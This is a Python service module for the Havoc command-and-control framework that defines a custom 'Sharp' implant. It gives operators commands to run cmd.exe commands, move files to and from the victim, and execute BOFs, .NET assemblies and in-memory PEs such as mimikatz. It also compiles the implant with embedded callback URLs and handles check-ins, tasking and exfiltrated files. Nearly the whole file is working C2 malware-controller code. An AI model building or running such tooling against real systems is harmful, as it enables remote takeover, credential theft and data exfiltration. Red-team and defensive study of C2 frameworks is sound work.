
from havoc.service import HavocService
from havoc.agent import *
import os, re

class CommandShell(Command):
    Name = "shell"
    Description = "Executes commands using cmd.exe"
    Help = "Example: shell whoami /all"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate")
        packer = Packer()

        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
        #AesIV = base64.b64decode(arguments["__meta_AesIV"])

        data = {"TaskCommand":"shell", "TaskFile":"", "TaskArguments":arguments["commands"].rstrip()}
        json_string = json.dumps(data, indent=4)
        packer.add_data(json_string)
        return packer.buffer[:-1]


class CommandExit(Command):
    Name        = "exit"
    Description = "Tells the agent to exit"
    Help        = "Just exit lmao"
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:

        packer = Packer()
        data = {"TaskCommand":"exit", "TaskFile":"", "TaskArguments":""}
        json_string = json.dumps(data, indent=4)
        packer.add_data(json_string)
        return packer.buffer[:-1]

class CommandSleep(Command):
    Name        = "sleep"
    Description = "Change the agent sleep time"
    Help = "Example: sleep 3"
    NeedAdmin = False
    Mitr = []
    Params = [
        CommandParam(
            name="sleeptime",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate")
        packer = Packer()

        data = {"TaskCommand":"sleep", "TaskFile":"", "TaskArguments":arguments["sleeptime"].rstrip()}
        json_string = json.dumps(data, indent=4)
        packer.add_data(json_string)
        return packer.buffer[:-1]

class CommandLs(Command):
    Name        = "ls"
    Description = "List directories"
    Help = "Example: ls C:\\"
    NeedAdmin = False
    Mitr = []
    Params = [
        CommandParam(
            name="path",
            is_file_path=False,
            is_optional=True
        )
    ]

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate")
        packer = Packer()

        data = {"TaskCommand":"ls", "TaskFile":"", "TaskArguments":arguments["path"].rstrip()}
        json_string = json.dumps(data, indent=4)
        packer.add_data(json_string)
        return packer.buffer[:-1]

class CommandUpload(Command):
    Name        = "upload"
    Description = "Upload a file. Need to specify full path to destination."
    Help = "Example: upload /etc/passwd \\Windows\\Temp\\bruh"
    NeedAdmin = False
    Mitr = []
    Params = [
        CommandParam(
            name="local_file",
            is_file_path=True,
            is_optional=False
        ),
        CommandParam(
            name="remote_path",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate")
        packer = Packer()
        
        data = {"TaskCommand":"upload", "TaskFile":arguments["local_file"], "TaskArguments":arguments["remote_path"].rstrip()}
        json_string = json.dumps(data, indent=4)
        packer.add_data(json_string)
        return packer.buffer[:-1]

class CommandDownload(Command):
    Name        = "download"
    Description = "Download a file. Need to specify full path to destination."
    Help = "Example: Download \\Windows\\Temp\\bruh"
    NeedAdmin = False
    Mitr = []
    Params = [
        CommandParam(
            name="remote_path",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate")
        packer = Packer()
        data = {"TaskCommand":"download", "TaskFile":"", "TaskArguments":arguments["remote_path"].rstrip()}
        json_string = json.dumps(data, indent=4)
        packer.add_data(json_string)
        return packer.buffer[:-1]
class CommandBofExec(Command):
    Name        = "bofexec"
    Description = "Run a bof. Need to specify full path to destination. No command line arg support for now."
    Help = "Example: bofexec Bofs/SAObjectFiles/whoami.x64.o"
    NeedAdmin = False
    Mitr = []
    Params = [
        CommandParam(
            name="local_bof",
            is_file_path=True,
            is_optional=False
        ),
    ]

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate")
        packer = Packer()

        #AesKey = base64.b64decode(arguments["__meta_AesKey"])
        #AesIV = base64.b64decode(arguments["__meta_AesIV"])
        packer.add_data("bofexec "+ arguments["local_bof"])
        return packer.buffer
class CommandInlineAssembly(Command):
    Name        = "inline_assembly"
    Description = "Run a .NET assembly in process. Need to specify full path to destination. No command line arg support for now."
    Help = "Example: inline_assembly Assemblies/seatbelt.exe"
    NeedAdmin = False
    Mitr = []
    Params = [
        CommandParam(
            name="local_assembly",
            is_file_path=True,
            is_optional=False
        ),
        CommandParam(
            name="args",
            is_file_path=False,
            is_optional=True
        )
    ]

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate")
        packer = Packer()

        data = {"TaskCommand":"inline_assembly", "TaskFile":arguments["local_assembly"], "TaskArguments":arguments["args"].rstrip()}
        json_string = json.dumps(data, indent=4)
        packer.add_data(json_string)
        return packer.buffer[:-1]
class CommandInlinePE(Command):
    Name        = "inline_pe"
    Description = "Run a x64 PE in memory. Need to specify full path to destination."
    Help = "Example: inline_pe PEs/mimikatz.exe"
    NeedAdmin = False
    Mitr = []
    Params = [
        CommandParam(
            name="local_exe",
            is_file_path=True,
            is_optional=False
        ),
        CommandParam(
            name="args",
            is_file_path=False,
            is_optional=True
        )
    ]

    def job_generate(self, arguments: dict) -> bytes:
        print("[*] job generate")
        packer = Packer()

        data = {"TaskCommand":"inline_pe", "TaskFile":arguments["local_exe"], "TaskArguments":arguments["args"].rstrip()}
        json_string = json.dumps(data, indent=4)
        packer.add_data(json_string)
        return packer.buffer[:-1]

class Sharp(AgentType):
    Name = "Sharp"
    Author = "@smallbraintranman"
    Version = "0.1"
    Description = f"""Test Description version: {Version}. I like C# a little too much."""
    MagicValue = 0x41414142

    Arch = [
        "x64",
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe",
        },
    ]

    BuildingConfig = {

        "Sleep": "5",
        "Check-in timeout time": "15",
        "Maximum Timeouts": "5",
#        "TestList": [
#            "list 1",
#            "list 2",
#            "list 3",
#        ],
#
#        "TestBool": True,
#
#        "TestObject": {
#            "TestText": "DefaultValue",
#            "TestList": [
#                "list 1",
#                "list 2",
#                "list 3",
#            ],
#            "TestBool": True,
#       }
#
    }

    #SupportedOS = [
    #    SupportedOS.Windows
    #]

    Commands = [
        CommandShell(),
        CommandExit(),
        CommandSleep(),
        CommandLs(),
        CommandUpload(),
        CommandDownload(),
        CommandBofExec(),
        CommandInlineAssembly(),
        CommandInlinePE(),
    ]

    def generate( self, config: dict ) -> None:

        #self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
        #self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        #self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )
        try:
            # Getting URL for agent
            urls = []
            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent secure: {config['Options']['Listener'].get('Secure')}" )
            if config['Options']['Listener'].get("Secure") == False:
                urlBase = "http://"+config['Options']['Listener'].get("Hosts")[0]+":"+config['Options']['Listener'].get("Port")
            else:
                urlBase = "https://"+config['Options']['Listener'].get("Hosts")[0]+":"+config['Options']['Listener'].get("Port")

            for endpoint in config['Options']['Listener'].get("Uris"):
                if endpoint[0] != '/': #check if the uri starts with /
                    urls.append(urlBase+'/'+endpoint)
                else:
                    urls.append(urlBase+endpoint)
            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent URLs: {urls}" )

            # Getting Sleep time for agent
            sleep = int(config['Config'].get('Sleep')) * 1000
            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Sleep: {sleep}" )

            # Get checkin timeout time for agent
            timeout = int(config['Config'].get('Check-in timeout time')) * 1000
            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Check-in Timeout: {timeout}" )

            #Get checkin max failed attempts
            maxTries = int(config['Config'].get('Maximum Timeouts'))
            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Max Timeouts: {maxTries}" )
            old_strings = ['url', 'sleepTime', 'timeout', 'maxTries']
            new_strings = [
                "url = new string[] {{ {} }};".format(str(urls).strip('[').strip(']').replace("'", "\"")), 
                "sleepTime = {};".format(sleep),
                "timeout = {};".format(timeout),
                "maxTries = {};".format(maxTries),
                ]
            # Read Config.cs
            with open("AgentCode/Config.cs") as f:
                s = f.read()

            # Safely write the specified configurations
            with open("AgentCode/Config.cs", 'w') as f:
                for i in range(len(old_strings)):
                    print('Changing [{0}] to [{1}] in AgentCode/Config.cs'.format(old_strings[i], new_strings[i]))
                    s = (re.sub(fr"{old_strings[i]}.*;", new_strings[i], s))
                f.write(s)
            #Payload time
            os.system("docker-compose up")
            in_file = open("AgentCode/bin/x64/Release/HavocImplant.exe", "rb") # opening for [r]eading as [b]inary
            data = in_file.read() # if you only wanted to read 512 bytes, do .read(512)
            in_file.close()
            os.system("rm AgentCode/bin/x64/Release/HavocImplant.exe")
            self.builder_send_payload( config[ 'ClientID' ], self.Name + ".exe", data )
        
        except:
            self.builder_send_message( config[ 'ClientID' ], "Error", "There was a build error, returning an empty blob so handler doesn't bork" )
            self.builder_send_payload( config[ 'ClientID' ], "THIS SHIT ERRORED", b'bruh' )
    
    def command_not_found(self, response: dict) -> dict:
        if response["CommandID"] == 90:  # CALLBACK_OUTPUT

            decoded = base64.b64decode(response["Response"])
            parser = Parser(decoded, len(decoded))
            output = parser.parse_bytes()

            return {
                "Type": "Good",
                "Message": f"Received Output [{len(output)} bytes]",
                "Output": output.decode('utf-8')
            }

        return {
            "Type": "Error",
            "Message": f"Command not found: [CommandID: {response['CommandID']}]",
        }
    
    def response( self, response: dict ) -> bytes:
        agent_header    = response[ "AgentHeader" ]
        agent_header    = response[ "AgentHeader" ]
        agent_response  = base64.b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.

        agentjson = json.loads(agent_response, strict=False)
        if agentjson["task"] == "register":
            print("[*] Registered agent")
            self.register( agent_header, json.loads(agentjson["data"]) )
            AgentID = response[ "AgentHeader" ]["AgentID"]
            self.console_message( AgentID, "Good", f"Sharp agent {AgentID} registered", "" )
            return b'registered'
        elif agentjson["task"] == "gettask":
            AgentID = response[ "Agent" ][ "NameID" ]
            Tasks = self.get_task_queue( response[ "Agent" ] )
            return Tasks
        elif agentjson["task"] == "commandoutput":
            AgentID = response[ "Agent" ][ "NameID" ]
            if len(agentjson["data"]) > 0:
                self.console_message( AgentID, "Good", "Received Output:", agentjson["data"] )
        elif agentjson["task"] == "download":
            AgentID = response[ "Agent" ][ "NameID" ]
            downloadJson = json.loads(agentjson["data"])
            fileName = downloadJson["FileName"]
            fileSize = downloadJson["FileSize"]
            fileContent = base64.b64decode(downloadJson["FileContent"]).decode("utf-8") 
            self.download_file( AgentID, fileName, fileSize, fileContent)
        return b''


def main():
    Havoc_Sharp = Sharp()
    Havoc_Service = HavocService(
        endpoint="ws://localhost:40056/service-endpoint",
        password="service-password"
    )

    Havoc_Service.register_agent(Havoc_Sharp)

    return


if __name__ == '__main__':
    main()
